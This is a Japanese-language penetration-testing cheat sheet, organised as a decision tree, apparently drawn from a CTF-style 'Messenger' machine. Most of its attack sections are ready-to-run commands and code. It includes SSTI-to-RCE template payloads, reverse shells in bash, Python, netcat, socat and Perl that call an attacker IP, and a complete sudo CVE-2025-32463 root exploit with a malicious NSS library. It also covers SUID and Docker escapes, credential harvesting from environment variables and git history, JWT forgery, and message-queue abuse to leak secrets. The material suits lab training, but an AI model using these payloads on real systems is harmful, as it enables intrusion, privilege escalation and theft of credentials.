# ペネトレーションテスト チートシート：Messenger マシンから学ぶテクニック

Messenger マシンを root まで攻略した際に使用したテクニックを、意思決定ツリー形式でまとめた。各分岐にはコマンド、確認すべきポイント、次のステップを記載する。

---

## レベル 0：準備

まずは接続確認と DNS 設定から。

```bash
ping -c 1 <TARGET>
```

応答がなければ VPN が落ちているかドメインが解決できていない。hosts に追記する：

```bash
echo "<TARGET_IP>  <TARGET_DOMAIN>" | sudo tee -a /etc/hosts
```

---

## レベル 1：列挙

### 1.1 ポートスキャン

```bash
nmap -sC -sV -p- --min-rate 1000 <TARGET> -oN nmap_full.txt
```

注目すべきポイント：

| ポート | サービス | 次の行動 |
|--------|----------|----------|
| 22 | SSH | メモしておく。後のピボットやブルートフォースで使う可能性 |
| 80/443 | HTTP | 1.2 へ |
| 3000, 5000, 8080, 8443, 9000 | Web アプリ / API | 各ポートで 1.2 へ |
| 5432 | PostgreSQL | 外部公開されているか確認 |
| 6379 | Redis | 公開されていれば大当たり |
| 15672 | RabbitMQ Management | 公開されていれば即座に狙う |
| 9200 | Elasticsearch | `curl IP:9200/_cat/indices` |
| 27017 | MongoDB | 認証有無を確認 |

nmap が遅い、またはフィルタされる場合：

```bash
masscan -p1-65535 --rate=1000 <TARGET>
# または
nc -zv <TARGET> 80 443 3000 8080 6379 15672
```

### 1.2 サービスフィンガープリント

```bash
nmap -sV -p <PORT> <TARGET>
curl -sI http://<TARGET>:<PORT>/
```

ヘッダーから多くの情報が得られる：

| ヘッダー | 意味 | 次 |
|----------|------|----|
| `Server: nginx` | 静的ファイル / リバースプロキシ | 背後の API を探す |
| `Server: gunicorn` | Python WSGI | Flask/FastAPI、API の可能性大 |
| `X-Powered-By: Express` | Node.js | Express API |
| `Server: Werkzeug` | Flask 開発サーバー | デバッグモードを確認 |
| `WWW-Authenticate: Bearer` | JWT 認証 | openapi.json を探す |

### 1.3 バーチャルホストのファジング

```bash
ffuf -u http://<TARGET>/ -H "Host: FUZZ.<TARGET_DOMAIN>" \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0
```

複数の vhost が見つかればマルチテナント構成。各 vhost が独立した攻撃面となる。

### 1.4 ディレクトリとファイルの発見

```bash
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
     -u http://<TARGET>/FUZZ -fw 158
```

SPA（React/Vue）では catch-all ルートにより誤検知が多発する。長さフィルタを併用する：

```bash
gobuster dir -u http://<TARGET>/ -w /usr/share/wordlists/dirb/common.txt \
             -k -t 50 --exclude-length 1125
```

| 発見物 | 意味 | 次 |
|--------|------|----|
| `swagger`, `openapi.json`, `redoc` | API ドキュメント | 1.6 へ |
| `admin`, `dashboard` | 管理パネル | 認証バイパスを試す |
| `.git/`, `.env`, `backup.zip` | 機密ファイル | 即座にダウンロード |
| `api/` | API ルート | `api/FUZZ` をファジング |

### 1.5 JS バンドル解析

SPA は API 全体を JavaScript ファイルの中に隠している。分解して読む。

```bash
# JS ファイル一覧
curl -s http://<TARGET>/ | grep -o 'src="[^"]*\.js"' | cut -d'"' -f2

# メインバンドルをダウンロード
curl -s http://<TARGET>/assets/index-XXXX.js -o index.js

# エンドポイントを抽出
grep -oE '"/api[^"]*"' index.js | sort -u
grep -oE "'/api[^']*'" index.js | sort -u
grep -oE 'baseURL[^,]*' index.js | head -5
```

| 発見物 | 意味 | 次 |
|--------|------|----|
| `baseURL:"/api/v1"` | API バージョン | このパス配下をテスト |
| `/api/v1/auth/register` | 登録 | アカウント作成 |
| `/api/v1/auth/login` | ログイン | トークン取得 |
| swagger にないエンドポイント | **隠しルート** | 全てテスト |
| JS 内の `"secret"`, `"token"` | クライアント側の秘密 | サーバー側で再利用されている可能性 |

### 1.6 API ドキュメントの発見

```bash
for p in /swagger.json /api/swagger.json /openapi.json /api/openapi.json \
         /swagger /swagger-ui.html /redoc /api/docs /docs; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>$p")
  echo "$code  $p"
done
```

`openapi.json` が `200` を返せば API 全体の地図を手に入れたも同然：

```bash
curl -s http://<TARGET>/api/openapi.json -o openapi.json
jq '.paths | keys[]' openapi.json
```

---

## レベル 2：アプリケーション解析

### 2.1 エンドポイントのマッピング

```bash
jq '.paths | keys[]' openapi.json
```

| パターン | 仮説 | テスト |
|----------|------|--------|
| `/api/v1/chats/{chat_id}/messages` | IDOR | 他人の chat_id を試す |
| `/api/v1/friendships/search` | ユーザー列挙 | よくあるユーザー名で検索 |
| `/api/v1/friendships/summary` | HTML を返すなら SSTI | 2.5 参照 |
| `/api/v1/admin/*` | アクセス制御の不備 | 非管理者トークンで試す |
| `/api/v1/auth/register` | アカウント作成 | 登録実行 |

### 2.2 認証方式の特定

```bash
curl -s -i http://<TARGET>/api/v1/<protected>
```

| レスポンス | 認証方式 |
|------------|----------|
| `401 + WWW-Authenticate: Bearer` | JWT / ベアラートークン |
| `401 + WWW-Authenticate: Basic` | Basic 認証 |
| `Set-Cookie: session=...` | セッションクッキー |

トークンを取得したら JWT のペイロードをデコード：

```bash
echo -n "$TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null | jq
# → {sub: "5", type: "access", iat: ..., exp: ...}
```

`sub` はユーザー ID。`type` はアクセスかリフレッシュかを示す。`exp` は有効期限：

```bash
date -d @<EXP_TIMESTAMP>
```

### 2.3 登録とログイン

```bash
curl -s -X POST http://<TARGET>/api/v1/auth/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"hunter1","email":"h@t.com","password":"Passw0rd!","firstName":"H","lastName":"One"}'

TOKEN=$(curl -s -X POST http://<TARGET>/api/v1/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"hunter1","password":"Passw0rd!"}' | jq -r .access_token)
```

| レスポンス | 次 |
|------------|----|
| `200 + access_token` | 2.4 へ |
| `404` | エンドポイントが違う。swagger/JS で再確認 |
| `already exists` | 既存の認証情報でログイン |

### 2.4 インジェクションテスト

**XSS：**

```bash
curl -s -X POST http://<TARGET>/api/v1/auth/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"<script>alert(1)</script>","email":"x@t.com","password":"Passw0rd!"}'
# その後、レンダリングされたページでエスケープされずに表示されるか確認
```

**SQL インジェクション：**

```bash
curl -s "http://<TARGET>/api/v1/friendships/search?search=admin'%20OR%20'1'='1"
# 結果件数が変化すれば injectable
```

**パストラバーサル：**

```bash
curl -s "http://<TARGET>/api/v1/files?name=../../../../etc/passwd"
curl -s "http://<TARGET>/api/v1/download?path=..%2F..%2F..%2Fetc%2Fpasswd"
```

**SSRF：**

```bash
curl -s "http://<TARGET>/api/v1/proxy?url=http://127.0.0.1:9732/"
curl -s "http://<TARGET>/api/v1/webhook?url=http://169.254.169.254/latest/meta-data/"
```

### 2.5 Content-Type の確認

多くの人が飛ばすステップ。全てのエンドポイントで実施する。

```bash
curl -s -D - http://<TARGET>/api/v1/friendships/summary \
  -H "Authorization: Bearer $TOKEN" -o /dev/null
```

| Content-Type | 意味 |
|--------------|------|
| `application/json` | 通常の API |
| `text/html; charset=utf-8` | **サーバーサイドテンプレートレンダリング** → SSTI 候補 |

原則：API が JSON ではなく HTML を返したら、サーバー側でテンプレートエンジンが動作している。全てのユーザー入力フィールドで SSTI をテストせよ。

---

## レベル 3：サーバーサイドテンプレートインジェクション（SSTI）

### 3.1 エンジンの検出

ユーザー入力可能な全てのフィールドに数式ペイロードを注入する。テンプレートエンジンごとに固有の構文がある。

| ペイロード | エンジン | 成功 = |
|------------|----------|--------|
| `{{7*7}}` | Jinja2 / Twig | `49` |
| `${7*7}` | Mako / JSP EL | `49` |
| `<%= 7*7 %>` | ERB（Ruby） | `49` |
| `{7*7}` | Smarty（PHP） | `49` |
| `[[${7*7}]]` | Thymeleaf（Java） | `49` |
| `#{7*7}` | Ruby 文字列展開 | `49` |

テスト手順：

```bash
# 1. ペイロードを username に入れて登録
curl -s -X POST http://<TARGET>/api/v1/auth/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"${7*7}","email":"t1@t.com","password":"Passw0rd!","firstName":"X","lastName":"Y"}'

# 2. ログイン
T=$(curl -s -X POST http://<TARGET>/api/v1/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"${7*7}","password":"Passw0rd!"}' | jq -r .access_token)

# 3. テンプレートをレンダリングさせる
curl -s http://<TARGET>/api/v1/friendships/summary \
  -H "Authorization: Bearer $T" | grep -E 'uid=|49|class='
```

| 結果 | 意味 |
|------|------|
| `49` | このエンジンで SSTI 確定 |
| `${7*7}`（リテラル） | このフィールドはレンダリングされない。別のフィールドを試す |
| 500 エラー | レンダリングがクラッシュ。ペイロードを掘り下げる |

### 3.2 レンダリングされるフィールドの特定

`firstName` や `lastName` はテンプレート変数として渡される（安全）が、`username` はテンプレートソースに直接結合される（危険）ケースがある。フィールドごとに個別テスト：

```bash
for FIELD in username firstName lastName bio; do
  echo "=== $FIELD ==="
  curl -s -X POST http://<TARGET>/api/v1/auth/register \
    -H 'Content-Type: application/json' \
    -d "{\"$FIELD\":\"\${7*7}\",\"email\":\"t_${FIELD}@t.com\",\"password\":\"Passw0rd!\"}" \
    | jq -r ".$FIELD"
done
```

`49` を返したフィールドが脆弱。

### 3.3 RCE の確認

**Mako：**

```python
${self.module.cache.util.os.popen('id').read()}
${self.module.cache.util.os.popen('whoami').read()}
${self.module.cache.util.os.popen('ls -la').read()}

# 代替
${self._Template__module._util.os.popen('id').read()}
${__import__('os').popen('id').read()}
```

**Jinja2（参考）：**

```
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

テスト：

```bash
curl -s -X POST http://<TARGET>/api/v1/auth/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"${self.module.cache.util.os.popen(\"id\").read()}","email":"rce1@t.com","password":"Passw0rd!","firstName":"X","lastName":"Y"}'

R=$(curl -s -X POST http://<TARGET>/api/v1/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"${self.module.cache.util.os.popen(\"id\").read()}","password":"Passw0rd!"}' | jq -r .access_token)

curl -s http://<TARGET>/api/v1/friendships/summary \
  -H "Authorization: Bearer $R" | grep -E 'uid=|gid='
```

| 結果 | 次 |
|------|----|
| `uid=1000(app) gid=1001(app)` | RCE 確定。3.4 へ |
| 空 | ペイロードは実行されたが出力なし。別コマンドを試す |
| 500 | 構文エラー。クォートを調整 |

### 3.4 リバースシェル

守るべきルール：

1. `sh` ではなく `bash` を使う。Ubuntu の `/bin/sh` は dash で、`/dev/tcp` をサポートしない。
2. ペイロード末尾に `&` を付けてバックグラウンド実行。付けないと curl がハングする。
3. ペイロードは base64 エンコード。クォートや特殊文字で壊れるのを防ぐ。
4. IP は `tun0` のものを使う。`eth0` ではない。

**bash（推奨）：**

```bash
# 1. リスナー
rlwrap -cAr nc -lvnp 4444

# 2. ペイロード生成
PAYLOAD='bash -i >& /dev/tcp/10.10.14.5/4444 0>&1 &'
B64=$(echo -n "$PAYLOAD" | base64 -w0)
echo "$B64"

# 3. 注入
# ${self.module.cache.util.os.popen('echo <B64> | base64 -d | bash').read()}
```

**Python（フォールバック）：**

```bash
PAYLOAD="python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.10.14.5\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
```

**netcat / socat：**

```bash
# nc
PAYLOAD='rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.5 4444 >/tmp/f'
# socat
PAYLOAD='socat exec:/bin/bash tcp:10.10.14.5:4444'
```

**Perl（稀なフォールバック）：**

```bash
PAYLOAD='perl -e "use Socket;\$i=\"10.10.14.5\";\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\$p,inet_aton(\$i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");"'
```

トラブルシューティング：

| 症状 | 原因 | 対処 |
|------|------|------|
| curl がハング | `&` がない | 末尾に `&` を追加 |
| curl は戻るが接続なし | dash が `/dev/tcp` 非対応 | `bash` を明示するか Python ペイロード |
| `Connection refused` | リスナーなし、またはポート遮断 | 開いているポートで `nc -lvnp` |
| `Permission denied` | パス制限 | `/tmp` を使用 |

**シェル取得後の TTY アップグレード：**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
# シェル上で Enter を数回
export TERM=xterm SHELL=/bin/bash
stty rows 40 cols 120
```

---

## レベル 4：特権昇格

### 4.1 初期列挙

```bash
whoami; id; hostname; uname -a; cat /etc/os-release
sudo -V | head -1
sudo -l 2>/dev/null
```

### 4.2 CVE チェック

| コンポーネント | 危険なバージョン | CVE |
|----------------|------------------|-----|
| sudo | `1.9.16p2` または `< 1.9.17p1` | CVE-2025-32463 |
| polkit | `< 0.120` | CVE-2021-4034（PwnKit） |
| kernel | `< 5.8` | CVE-2022-0847（Dirty Pipe） |
| kernel | `< 4.8.3` | CVE-2016-5195（Dirty COW） |

### 4.3-A CVE-2025-32463（sudo -R + NSS）

メカニズム：`sudo -R <chroot>` は chroot 内の `nsswitch.conf` を読み、特権を落とす前に NSS 共有オブジェクトをロードする。悪意ある `.so` を用意すれば、その constructor が root 権限で実行される。

自動化：

```bash
git clone https://github.com/pr0v3rbs/CVE-2025-32463_chwoot.git
cd CVE-2025-32463_chwoot
chmod +x sudo-chwoot.sh
./sudo-chwoot.sh
# → woot! と root シェル
```

手動：

```bash
# 1. 悪意ある NSS ライブラリをビルド
cat > /tmp/woot.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void woot(void) {
    setreuid(0,0); setregid(0,0);
    execl("/bin/bash","bash","-p",NULL);
}
EOF
mkdir -p /tmp/stage/libnss_
gcc -shared -fPIC -Wl,-init,woot -o /tmp/stage/libnss_/woot1337.so.2 /tmp/woot.c

# 2. 偽の chroot を構築
mkdir -p /tmp/stage/woot/etc
echo "passwd: /woot1337" > /tmp/stage/woot/etc/nsswitch.conf
cp /etc/group /tmp/stage/woot/etc/

# 3. stage ディレクトリ内から実行
cd /tmp/stage && sudo -R woot woot
```

`-Wl,-init,woot` フラグが重要。関数を ELF の `DT_INIT` に設定し、glibc はロード時に必ずこれを呼ぶ。`__attribute__((constructor))` 単体では NSS のロード方法によってスキップされる場合がある。

### 4.3-B SUID とケイパビリティ

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
getcap -r / 2>/dev/null
```

GTFOBins で既知の SUID バイナリを悪用する：

| SUID | エスケープ |
|------|------------|
| `nmap` | `nmap --interactive` → `!sh` |
| `vim` | `vim -c ':!sh'` |
| `find` | `find . -exec /bin/sh -p \; -quit` |
| `bash` | `bash -p` |
| `python` | `python -c 'import os;os.setuid(0);os.system("/bin/sh")'` |

### 4.3-C Cron

```bash
cat /etc/crontab; ls -la /etc/cron.*
ps aux | grep cron
find / -type f -perm -o+w 2>/dev/null | grep -E 'cron|\.sh'
```

### 4.4 認証情報ファイル

```bash
cat ~/.bash_history ~/.ssh/* 2>/dev/null
find / -name ".env" -o -name "*.config" -o -name "credentials*" 2>/dev/null | grep -v proc
find / -name "*.db" -o -name "*.sqlite*" 2>/dev/null | grep -v proc
```

### 4.5 その他の経路

| 経路 | トリガー |
|------|----------|
| `sudo -l` に任意バイナリ | GTFOBins のエントリ |
| ユーザーが `docker` グループ | `docker run -v /:/mnt alpine chroot /mnt /bin/bash` |
| ユーザーが `lxd` グループ | LXC コンテナエスケープ |
| `/etc/passwd` 書き込み可能 | UID=0 ユーザーを追加 |
| `~/.ssh/authorized_keys` 書き込み可能 | 自分の鍵を追加 |

---

## レベル 5：認証情報探索

### 5.1 ホームディレクトリ

```bash
ls -la /root /home/* 2>/dev/null
find / -name "*.env" -o -name ".env" 2>/dev/null | grep -v proc
```

### 5.2 設定ファイルと秘密情報

```bash
grep -rIl "password\|secret\|token\|api_key" /etc /opt /app /home 2>/dev/null | head -20
```

### 5.3 ディスク上の Git リポジトリ

```bash
find / -type d -name ".git" 2>/dev/null
# ヒットしたらレベル 6 へ
```

### 5.4 プロセスの環境変数

```bash
env
cat /proc/1/environ | tr '\0' '\n'
cat /proc/self/environ | tr '\0' '\n'
```

| ファイル | 内容 |
|----------|------|
| `/root/gitness` | Gitness のトークンとパスワード |
| `/app/.env` | データベース URL、秘密鍵 |
| `/etc/hosts`, `/etc/resolv.conf` | 内部ネットワーク、DNS |
| `~/.aws/credentials` | IAM キー |
| `~/.docker/config.json` | レジストリ認証 |

トークンやパスワードを含むファイルはすべて、次のサービスへの鍵となる。

---

## レベル 6：Git 履歴の発掘

コミットして「削除」した秘密情報は本当には消えていない。`git rm` は履歴を削除せず、削除の記録を追加するだけ。

### 6.1 クローン

```bash
# Basic 認証
git clone http://user:pass@host:3000/space/repo.git

# Bearer / PAT
git clone http://oauth2:${TOKEN}@host:3000/space/repo.git

# SSH
git clone ssh://git@host:2222/space/repo.git

# UI のみの場合、API 経由で zip エクスポート
curl -s "http://host:3000/api/v1/repos/<space>/<repo>/archive/main.zip" \
  -H "Authorization: Bearer $TOKEN" -o repo.zip
```

### 6.2 履歴の列挙

```bash
git log --all --oneline                # 全ブランチの全コミット
git log --all --stat                   # 変更ファイル付き
git log -p --all                       # 完全な diff
git branch -a                          # 全ブランチ
git tag                                # 全タグ
```

### 6.3 削除されたファイルの発見

```bash
# 履歴内の削除ファイル
git log --all --diff-filter=D --name-only --pretty=format:"%H %s"

# これまでコミットされたことのある .env
git log --all --full-history -- .env

# 特定コミットの特定ファイルを表示
git show <COMMIT_SHA>:path/to/.env

# 履歴最初の .env を抽出
git show $(git log --all --full-history --format=%H -- .env | head -1):.env
```

### 6.4 自動秘密情報スキャン

```bash
git log -p --all | grep -iE "password|secret|token|api[_-]?key|BEGIN.*PRIVATE"
gitleaks detect --source . --verbose
trufflehog git file://. --only-verified
```

| 発見物 | 次 |
|--------|----|
| `REFRESH_TOKEN=eyJ...` | API に対して使用 |
| `AWS_ACCESS_KEY_ID=...` | `aws sts get-caller-identity` |
| `DATABASE_URL=...` | `psql` / `mysql` |
| `PRIVATE KEY` | SSH/TLS 鍵の再利用 |

---

## レベル 7：窃取したトークンによる API 悪用

### 7.1 トークン種別の特定

```bash
echo -n "$TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null | jq
# type: access / refresh / pat
```

### 7.2 トークンのテスト

```bash
for ep in /api/v1/user /api/v1/auth/myself /api/v1/auth/me; do
  echo "=== $ep ==="
  curl -s "http://<TARGET>$ep" -H "Authorization: Bearer $TOKEN" -w "\n[HTTP %{http_code}]\n"
done
```

### 7.3 IDOR / BOLA

```bash
# 自分のリソース
curl -s http://<TARGET>/api/v1/chats/6/messages -H "Authorization: Bearer $TOKEN"

# 他人のリソース
curl -s http://<TARGET>/api/v1/chats/7/messages -H "Authorization: Bearer $TOKEN"
# データが返れば IDOR
```

### 7.4 リフレッシュからアクセスへ

```bash
curl -s -X POST http://<TARGET>/api/v1/auth/refresh \
  -H "Content-Type: application/json" \
  -d "{\"refresh_token\":\"$REFRESH\"}"

# または Bearer 経由
curl -s -X POST http://<TARGET>/api/v1/auth/refresh \
  -H "Authorization: Bearer $REFRESH"
```

### 7.5 JWT 偽造（`JWT_SECRET_KEY` が漏洩した場合）

```python
import jwt, datetime
payload = {
    "sub": "1",              # admin
    "type": "access",
    "iat": int(datetime.datetime.now().timestamp()),
    "exp": int((datetime.datetime.now() + datetime.timedelta(days=1)).timestamp()),
}
print(jwt.encode(payload, "<LEAKED_JWT_SECRET>", algorithm="HS256"))
```

```bash
curl -s http://<TARGET>/api/v1/admin/users -H "Authorization: Bearer $FORGED"
# 200 → 管理者権限
```

---

## レベル 8：Docker ネットワークのピボット

### 8.1 サブネットの特定

```bash
hostname -I
ip a
cat /etc/hosts
```

| 範囲 | 意味 |
|------|------|
| `172.17.x.x` | Docker デフォルトブリッジ |
| `172.18.x.x`–`172.30.x.x` | Docker カスタムネットワーク |
| `10.x.x.x` | 通常ネットワークまたはオーバーレイ |
| `fd00::` | IPv6 ULA |

### 8.2 nmap なしで隣接ホストをスキャン

```bash
python3 -c "
import socket
from concurrent.futures import ThreadPoolExecutor
def check(args):
    ip, port = args
    try:
        with socket.socket() as s:
            s.settimeout(0.3)
            if s.connect_ex((ip, port)) == 0:
                print(f'OPEN {ip}:{port}')
    except: pass
base = '172.22.2.'
ports = [22, 80, 443, 2375, 3000, 5000, 5432, 6379, 8000, 8080, 9000, 15672, 27017]
tasks = [(f'{base}{i}', p) for i in range(1,255) for p in ports]
with ThreadPoolExecutor(max_workers=200) as ex:
    list(ex.map(check, tasks))
"
```

### 8.3 サービスの特定

| ポート | サービス | テスト |
|--------|----------|--------|
| 2375/2376 | Docker デーモン（TLS なし） | `curl http://IP:2375/version` → ホストの root |
| 5432 | PostgreSQL | `psql -h IP -U postgres` |
| 6379 | Redis | `redis-cli -h IP` |
| 15672 | RabbitMQ Management | 認証情報で Web UI |
| 27017 | MongoDB | `mongo IP:27017` |
| 9200 | Elasticsearch | `curl IP:9200/_cat/indices` |

2375 が開いている場合：

```bash
docker -H tcp://IP:2375 ps
docker -H tcp://IP:2375 run -v /:/host alpine chroot /host /bin/bash
# → ホスト自体の root
```

---

## レベル 9：メッセージキューの悪用

### 9.1 RabbitMQ Management へのアクセス

```bash
curl -s -u user:pass http://IP:15672/api/overview | head -c 200
# JSON → 認証情報 OK
# 401 → 認証情報誤り
```

### 9.2 vhost とキューの発見

```bash
# vhost
curl -s -u user:pass http://IP:15672/api/vhosts | jq '.[].name'

# vhost 上のキュー
curl -s -u user:pass http://IP:15672/api/queues/<VHOST> | jq '.[] | {name, consumers, messages}'

# 単一キュー
curl -s -u user:pass "http://IP:15672/api/queues/<VHOST>/<QUEUE>" | jq '{name, consumers, messages}'
```

| フィールド | 意味 | 次 |
|------------|------|----|
| `consumers >= 1` | ワーカー稼働中 | タスクをトリガー可能 |
| `consumers = 0` | ワーカーなし | 起動するか別経路を探す |
| `messages > 100k` | キュー滞留 | メッセージ処理に時間がかかる |
| `messages < 1000` | ほぼ空 | 高速配信 |

### 9.3 タスク形式の発見

まずワーカーのソースを読む。Git リポジトリまたはディスク上の `tasks.py` を探す。

```bash
cat /app/tasks.py
```

`@shared_task` デコレータを探す：

```python
@shared_task
def send_environment_variables_to_chat(sender_id: int, chat_id: int):
    envs_verbose = "\n".join(f"{k}={v}" for k, v in os.environ.items())
    ...
```

Celery ペイロード形式：

```json
{
  "properties": {
    "content_type": "application/json",
    "content_encoding": "utf-8",
    "delivery_mode": 2,
    "headers": {
      "task": "app.tasks.<TASK_NAME>",
      "id": "<UUID>"
    }
  },
  "routing_key": "<QUEUE_NAME>",
  "payload": "[[<ARG1>, <ARG2>], {}, {\"callbacks\": null, \"errbacks\": null, \"chain\": null, \"chord\": null}]",
  "payload_encoding": "string"
}
```

| フィールド | 取得元 |
|------------|--------|
| `task` | `tasks.py` の完全な関数パス |
| `routing_key` | 9.2 で特定したキュー名 |
| `payload[0]` | シグネチャ順の位置引数 |
| `payload[1]` | キーワード引数（通常は `{}`） |

### 9.4 Redis 出力チャネルへの先行サブスクライブ

Pub/Sub はメッセージをキューイングしない。発火時にサブスクライバがいなければ消える。トリガー前にサブスクライブせよ。

```python
# /tmp/listen.py
import socket, sys
s = socket.socket()
s.settimeout(120.0)
s.connect(("<REDIS_IP>", 6379))
# SUBSCRIBE <CHANNEL>
s.sendall(b"*2\r\n$9\r\nSUBSCRIBE\r\n$<LEN>\r\n<CHANNEL>\r\n")
while True:
    data = s.recv(65536)
    if not data: break
    sys.stdout.write(data.decode('utf-8', errors='ignore'))
    sys.stdout.flush()
```

RESP の分解：
- `*2` = 2 要素の配列
- `$9\r\nSUBSCRIBE` = 長さ接頭辞付き文字列 "SUBSCRIBE"
- `$<LEN>\r\n<CHANNEL>` = 長さ接頭辞付きチャネル名

```bash
python3 /tmp/listen.py > /tmp/out.txt 2>&1 &
```

### 9.5 トリガーと取得

```bash
curl -s -u user:pass -H "Content-Type: application/json" -X POST \
  --data @payload.json \
  "http://IP:15672/api/exchanges/<VHOST>/amq.default/publish"
# {"routed":true} = 発行成功

sleep 3
grep "FLAG" /tmp/out.txt
```

### 9.6 代替手段

| 状況 | 代替 |
|------|------|
| `consumers = 0` | ワーカー起動待ちの可能性。後で再試行 |
| ペイロードが拒否される | Celery v4 と v5 のメッセージ形式を両方試す |
| Redis に認証あり | env や config からパスワードを探す |
| UI が閉じている | `pika` で 5672 の AMQP を直接使用 |

---

## レベル 10：ポストエクスプロイテーション

```bash
# プロセス全体の環境変数
cat /proc/1/environ | tr '\0' '\n'
cat /proc/self/environ | tr '\0' '\n'

# システム全体で秘密情報を grep
grep -rIl "FLAG\|SECRET\|KEY" /app /opt /etc /home 2>/dev/null | head

# SQLite
sqlite3 /app/data.db ".tables"

# Redis
redis-cli -h <host> KEYS "*"
redis-cli -h <host> GET secret
```

---

## 意思決定チートシート

| 発見したら... | 移動先 | 主要ツール |
|---------------|--------|------------|
| `openapi.json` | レベル 2 | `jq .paths` |
| API が `Content-Type: text/html` を返す | レベル 3 | `{{7*7}}`, `${7*7}` |
| SSTI が評価される | レベル 3.4 | `os.popen` + リバースシェル |
| シェル取得 | レベル 4 | `sudo -V`, `uname -a`, SUID |
| トークンを含むファイル | レベル 7 | `curl -H "Authorization: Bearer ..."` |
| Git リポジトリ | レベル 6 | `git log --all`, gitleaks |
| 内部サービス | レベル 8 | サブネットスキャン |
| RabbitMQ + Redis + Celery | レベル 9 | サブスクライブ後に publish |
| `JWT_SECRET_KEY` 漏洩 | レベル 7.5 | 管理者 JWT を偽造 |

---

## 10 の原則

1. 全てのエンドポイントで `Content-Type` を確認せよ。API が HTML を返すなら SSTI。
2. 全ての入力フィールドを個別にテストせよ。あるフィールドはエスケープされ、別のフィールドはされていないことがある。
3. リバースシェルのペイロードは base64 エンコードせよ。特殊文字がインラインで壊れる。
4. `sh` ではなく `bash` を使え。dash には `/dev/tcp` がない。
5. リバースシェルには `&` を付加せよ。付けないと curl がハングする。
6. Git 履歴全体を歩け。削除されたファイルもブロブとして存在する。
7. リフレッシュトークンはアクセストークンに交換せよ。一つのトークンが両方に使えると仮定するな。
8. Docker サブネットをスキャンせよ。コンテナの localhost はターゲットの localhost ではない。
9. パブリッシャーをトリガーする前に Pub/Sub チャネルをサブスクライブせよ。
10. キューの `consumers: 1` がワーカー生存の証拠。コンシューマのいないキューはブラックホール。

---

## ツールリファレンス

| カテゴリ | ツール |
|----------|--------|
| 列挙 | nmap, ffuf, gobuster, feroxbuster |
| API | postman, swagger-editor, kiterunner |
| SSTI | tplmap, payloadsallthethings |
| シェル | revshells.com, nc, socat, rlwrap |
| 特権昇格 | linpeas, LinEnum, pspy, linux-exploit-suggester |
| Git | gitleaks, trufflehog, gitrob |
| Docker | deepce, amicontained |
| JWT | jwt_tool, hashcat |


2026/10/19
